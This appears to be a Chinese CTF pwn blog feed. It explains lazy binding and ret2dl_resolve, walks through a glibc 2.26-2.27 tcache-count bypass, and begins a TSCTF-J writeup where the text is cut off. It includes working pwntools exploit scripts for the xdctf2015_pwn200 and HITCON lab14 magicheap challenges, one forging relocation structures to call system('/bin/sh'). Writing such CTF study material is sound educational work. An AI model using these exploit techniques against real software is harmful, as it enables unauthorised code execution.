ELF是通过函数<code>_dl_runtime_resolve(link_map_obj, reloc_arg)</code>实现绑定的.<br>$\color{pink}{第一步}$，每个导入函数都在PLT表中有一个条目，当函数第一次被调用时,程序通过call指令执行到该函数(以read举例)的read@plt条目的第一条指令，read@plt表的第一指令为跳转到read@got条目，而因为read函数是第一次被调用，此时read@got条目中存的是read@plt条目第二条指令的位置，再跳转回来相当于就是顺序执行read@plt的指令.<br>$\color{pink}{第二步}$，read@plt条目的第二条指令是将导入函数的标识(Elf_Rel在.rel.plt段中的偏移,也就是参数中的reloc_index)压入栈中，然后跳转到PLT0执行<br>$\color{pink}{第三步}$，PLT0包含两条指令，先将GOT[1]的值(也就是<code>_dl_runtime_resolve)</code>函数的第一个参数link_map_obj)压入栈中，然后跳转到GOT[2]保存的地址处，即<code>_dl_runtime_resolve)</code>函数.<br>$\color{pink}{第四步}$，<code>_dl_runtime_resolve)</code>函数完成地址的绑定，大概逻辑是这样的：<br>先通过link_map获得重定位函数所在了 libary 的基地址及<code>.dynamic</code>的地址，也就获得了.dynamic节中存有的其他和绑定相关的节(.dynsym .dynstr .rela.plt)的地址。利用第二个参数reloc_arg及rela.plt可以得到read函数在.dynsym中的下标，进而得到read函数符号表项<code>Elf32_Sym</code>(<code>Elf64_Sym</code>)的指针，记作sym。.dynstr节的地址+sym-&gt;st_name得到”read\x00”这一字符串的地址，再将字符串地址作为参数利用<code>_dl_lookup_symbol_x</code>函数在动态库中遍历搜索得到函数地址，填入read@got条目内并调用。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><ol><li>关闭RELRO保护：即.dynamic段可写。动态装载器是通过.dynamic段来获取.dynstr节的地址，故可以通过改写.dynamic段相应DT_STRTAB来在任意地址伪造.dynstr节并欺骗动态装载器</li><li>开启Partial RELRO保护：通过伪造参数reloc_index可制造一个巨大的偏移，使得内存地址超出.rel.plt段来到.bss段，攻击者就可伪造fake_rel等结构欺骗动态装载器</li><li>Full RELRO: 详见(2)部分内容</li></ol><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_3.png"></p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_1.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/xdctf2015_pwn200_2.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 启动程序</span><span class="token comment" spellcheck="true"># io = remote('node4.buuoj.cn',26320)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># io = gdb.debug('./bof')</span>e <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./bof'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc = ELF('./')</span><span class="token comment" spellcheck="true"># 源程序gadget</span>write_plt <span class="token operator">=</span> <span class="token number">0x80483C0</span>vuln <span class="token operator">=</span> <span class="token number">0x80484D6</span>bss_addr <span class="token operator">=</span> e<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>pop_ebp <span class="token operator">=</span> <span class="token number">0x804862b</span>leave_ret <span class="token operator">=</span> <span class="token number">0x8048445</span>pop_ebx_esi_edi_ebp <span class="token operator">=</span> <span class="token number">0x8048628</span><span class="token comment" spellcheck="true"># 程序中section地址</span>plt0 <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrrel_plt <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.rel.plt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrdynsym <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynsym'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrdynstr <span class="token operator">=</span> e<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">'.dynstr'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr<span class="token comment" spellcheck="true"># 伪造相应结构</span>stack_size <span class="token operator">=</span> <span class="token number">0x800</span>base_stage <span class="token operator">=</span> bss_addr <span class="token operator">+</span> stack_sizefake_dynsym_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">32</span>align <span class="token operator">=</span> <span class="token number">0x10</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span>fake_dynsym_addr <span class="token operator">+=</span> alignfake_dynstr_addr <span class="token operator">=</span> fake_dynsym_addr<span class="token operator">+</span><span class="token number">16</span>st_name <span class="token operator">=</span> fake_dynstr_addr <span class="token operator">-</span> dynstrst_value <span class="token operator">=</span> <span class="token number">0</span>st_size <span class="token operator">=</span> <span class="token number">0</span>st_info <span class="token operator">=</span> <span class="token number">0x12</span><span class="token comment" spellcheck="true">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type</span>fake_dynsym <span class="token operator">=</span> p32<span class="token punctuation">(</span>st_name<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_value<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_size<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>st_info<span class="token punctuation">)</span>fake_rel_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">24</span>reloc_arg <span class="token operator">=</span> fake_rel_addr<span class="token operator">-</span>rel_pltr_sym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_dynsym_addr<span class="token operator">-</span>dynsym<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">0x10</span>r_type <span class="token operator">=</span> <span class="token number">0x7</span>r_info <span class="token operator">=</span> <span class="token punctuation">(</span>r_sym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span>r_type<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>r_offset <span class="token operator">=</span> e<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>fake_rel <span class="token operator">=</span> p32<span class="token punctuation">(</span>r_offset<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>r_info<span class="token punctuation">)</span>fake_dynstr <span class="token operator">=</span> b<span class="token string">'system\x00'</span><span class="token comment" spellcheck="true"># stack pivot</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload_migrate <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">,</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pop_ebx_esi_edi_ebp<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>base_stage<span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">,</span>base_stage<span class="token number">-4</span><span class="token punctuation">,</span>leave_ret<span class="token punctuation">]</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload_migrate<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># ret2dl_resolve</span>binsh_addr <span class="token operator">=</span> base_stage<span class="token operator">+</span><span class="token number">80</span>payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>plt0<span class="token punctuation">,</span>reloc_index<span class="token punctuation">,</span><span class="token string">'retn'</span><span class="token punctuation">,</span>binsh_addr<span class="token punctuation">,</span><span class="token string">'arg1'</span><span class="token punctuation">,</span><span class="token string">'arg2'</span><span class="token punctuation">,</span>fake_rel<span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span>align<span class="token punctuation">,</span>fake_dynsym<span class="token punctuation">,</span>fake_dynstr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> b<span class="token string">'/bin/sh\x00'</span>payload <span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span>b<span class="token string">'a'</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p>感谢师傅们的文章！<br>最最最详细(包括64位利用细节)：<a href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">ret2_dl_runtime_resolve详解</a><br>最最最容易理解：<a href="https://zikh26.github.io/posts/ba418f23.html">关于ret2_dl_runtime_resolve的学习总结</a><br>以及CTF权威指南(Pwn篇)</p>]]></content>
      
      
      <categories>
          
          <category> Stack Overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache机制绕过</title>
      <link href="/2022/11/10/tcache-ji-zhi-rao-guo/"/>
      <url>/2022/11/10/tcache-ji-zhi-rao-guo/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>Tcache 是 glibc 2.26 (ubuntu 17.10) 之后引入的一种技术，目的是提升堆管理的性能。<br>对攻击者而言,Tcache的不安全机制为攻击者带来了大量新的漏洞利用方式，但同时也使先前的一些利用方法(如Unsortedbin Attak)等漏洞利用减弱甚至失效，并且在一些题中Tcache的利用会相当麻烦。故本文探究Tcache机制的绕过方法(glibc2.26-2.27)</p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><h2 id="1-分配大小不在Tcache范围内的堆块"><a href="#1-分配大小不在Tcache范围内的堆块" class="headerlink" title="1.分配大小不在Tcache范围内的堆块"></a>1.分配大小不在Tcache范围内的堆块</h2><p>好像说了句废话，不过在某些题中还是有用的.<br>Tcache的chunk范围在0x410(1032)字节以内</p><h2 id="2-填满Tcache"><a href="#2-填满Tcache" class="headerlink" title="2.填满Tcache"></a>2.填满Tcache</h2><p>好像也是句废话<br>free某个tcache超过7次，也就是将存放在tcache结构体中的该范围bins的数量占满，后续free的堆块就会放到相应的bin中</p><h2 id="3-修改Tcache结构体中的counts域"><a href="#3-修改Tcache结构体中的counts域" class="headerlink" title="3.修改Tcache结构体中的counts域"></a>3.修改Tcache结构体中的counts域</h2><p>所谓的绕过Tcache机制，无非就是使释放的堆块不进入Tcache中，分配的堆块不从Tcache中取出.</p><h3 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h3><p>如果我们想让释放的堆块不进入Tcache中，就需要对应Tcache bin的counts域不小于tcache_count(默认为7)，即Tcache已满.但如过counts域不为0，在分配堆块时就一定会从Tcache中取出,前后两个发生冲突.</p><h3 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h3><p>下面是tcache_put的调用过程</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>          <span class="token comment" spellcheck="true">/* Fill cache first, return to user only if cache fills.         We may return one of these chunks later.  */</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb          <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span>        <span class="token punctuation">{</span>          <span class="token function">tcache_put</span> <span class="token punctuation">(</span>victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>          return_cached <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>          <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>          <span class="token keyword">else</span>        <span class="token punctuation">{</span><span class="token macro property">#<span class="token directive keyword">endif</span></span>              <span class="token function">check_malloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token macro property">#<span class="token directive keyword">if</span> USE_TCACHE</span>        <span class="token punctuation">}</span></code></pre><p>重点关注这一条件判断，如果我们能绕过这一判断进入else，就能实现绕过Tcache机制进行堆块分配</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span>tcache_nb          <span class="token operator">&amp;&amp;</span> tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span></code></pre><p>于是我们便在源码中寻找各变量的定义<br>tcache_perthread_struct结构体中定义了char 类型的counts数组</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> tcache_perthread_struct<span class="token punctuation">{</span>  <span class="token keyword">char</span> counts<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span>  tcache_entry <span class="token operator">*</span>entries<span class="token punctuation">[</span>TCACHE_MAX_BINS<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span> tcache_perthread_struct<span class="token punctuation">;</span></code></pre><p>glibc中并没有给出mp_.tcache_count的类型定义，不过我们可通过这一赋值操作推出mp_.tcache_count是size_t类型，而size_t在大部分机器上是无符号整型</p><pre class=" language-c"><code class="language-c"><span class="token function">do_set_tcache_count</span> <span class="token punctuation">(</span>size_t value<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">LIBC_PROBE</span> <span class="token punctuation">(</span>memory_tunable_tcache_count<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> mp_<span class="token punctuation">.</span>tcache_count<span class="token punctuation">)</span><span class="token punctuation">;</span>  mp_<span class="token punctuation">.</span>tcache_count <span class="token operator">=</span> value<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>于是counts是char类型，mp_.tcache_count是size_t类型，在比较时会发生整型提升，故若能使counts为一个负数，便可绕过这一判断<br>那有没有办法使counts变为一个负数呢？答案是有，可以通过整数溢出做到<br>在tcache_get中存在对counts域的–操作，于是只要从Tcache中分配出的chunk数量大于释放进Tcache的数量，便可使counts变为一个负数</p><pre class=" language-c"><code class="language-c"><span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>对于上述操作，可以通过Tcache Poisoning技术做到(即伪造一个Tcache中的chunk,且由于Tcache分配时无对size域的检查,使这一操作能够轻松完成)<br>到此我们便完成了Tcache机制的绕过</p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>这一绕过方法得益于glibc2.26-2.27中tcache_get函数的错误assert操作</p><pre class=" language-c"><code class="language-c"><span class="token function">tcache_get</span> <span class="token punctuation">(</span>size_t tc_idx<span class="token punctuation">)</span><span class="token punctuation">{</span>  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//第二个断言的内容是错误的，本意应该是检查counts的符号</span>  <span class="token comment" spellcheck="true">//即assert(tcache->counts[tc_idx]>0);</span>  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这一漏洞已在glibc2.28后的版本中修复</p><h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><p>看起来感觉挺鸡肋，但是大多数题目会限制分配堆块的大小和数量，此时前两个绕过方法便已失效,这一方法便有了用武之地</p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>还是以Unsortedbin Attack的经典题hitcontraining_lab14为例</p><h4 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h4><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><ol><li>题目中edit_heap函数没有对size的限制存在堆溢出<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/HITCON%20Training%20lab14%20magic%20heap2.png"></li><li>若bss段变量magic&gt;4869即可执行后门函数<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/HITCON%20Training%20lab14%20magic%20heap1.png"><br>所以就是Unsortedbin Attack修改magic的值</li></ol><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre class=" language-python"><code class="language-python">io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./magicheap'</span><span class="token punctuation">)</span>magic_addr <span class="token operator">=</span> <span class="token number">0x6020C0</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> <span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span><span class="token string">'4869'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>tcache_poisoning <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x602200</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>tcache_poisoning<span class="token punctuation">)</span><span class="token punctuation">,</span>tcache_poisoning<span class="token punctuation">)</span>  create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#此时Tcache的counts域已为-1，完成绕过</span>  create<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token string">'bbbb'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 防止与top chunk合并</span><span class="token comment" spellcheck="true">#Unsortedbin Attack</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span>b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>magic_addr<span class="token number">-0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span> magic<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h1><p>文中提出的这一绕过方法利用价值不大，但这也是我第一次通过源码来分析问题，还是有一点纪念意义的<br>我倒是希望在以后的做题中能有这一绕过方法的用武之地吧</p>]]></content>
      
      
      <categories>
          
          <category> 探究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022TSCTF-J</title>
      <link href="/2022/11/09/2022tsctf-j-writeup-2022.10.17/"/>
      <url>/2022/11/09/2022tsctf-j-writeup-2022.10.17/</url>
      
        <content type="html"><![CDATA[<p>[[PWN ？！]]<br>[[PWN生涯]]</p><ul><li><h3 id="–writeby-HanQi"><a href="#–writeby-HanQi" class="headerlink" title="–writeby__HanQi"></a>–writeby__HanQi</h3></li><li><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1>算是正式做的第一次比赛吧，啥也不会坐牢四天（悲<br>题目难度感觉还好(不会做都是我太菜)（比moe或hn难一点？至少pwn题是这样<br>也是第一次写wp，认真写一下留个纪念</li><li><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><ul><li><h2 id="checkin-stackoverflow"><a href="#checkin-stackoverflow" class="headerlink" title="checkin(stackoverflow)"></a>checkin(stackoverflow)</h2><ul><li><h3 id="checksec-IDA"><a href="#checksec-IDA" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>栈溢出覆盖ch_0的值就好了</li><li><img src="https://i.niupic.com/images/2022/10/17/a9tq.png"></li><li><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><img src="https://i.niupic.com/images/2022/10/17/a9tr.png"></li></ul></li><li><h2 id="ヰ世界転生-int-overflow-ret2text"><a href="#ヰ世界転生-int-overflow-ret2text" class="headerlink" title="ヰ世界転生(int overflow+ret2text)"></a>ヰ世界転生(int overflow+ret2text)</h2><ul><li><h3 id="checksec-IDA-1"><a href="#checksec-IDA-1" class="headerlink" title="checksec+IDA"></a>checksec+IDA</h3>循环lose累积分数<br><img src="https://i.niupic.com/images/2022/10/17/a9tG.png">{:height 992, :width 776}<br>末尾有一个point_checker的函数，进去看一眼，给points设了上限，盲猜是整型溢出<br><img src="https://i.niupic.com/images/2022/10/17/a9ts.png"><br>然后是用分数换技能，前面花里胡哨没啥用（命名竟然比技能贵…<br><img src="https://i.niupic.com/images/2022/10/17/a9tt.png"><br>从有输入的地方开始看，第一次先输入长度nbytes，再第二次输入内容存到buf，对nbytes有长度限制，估计还是整型溢出<br><img 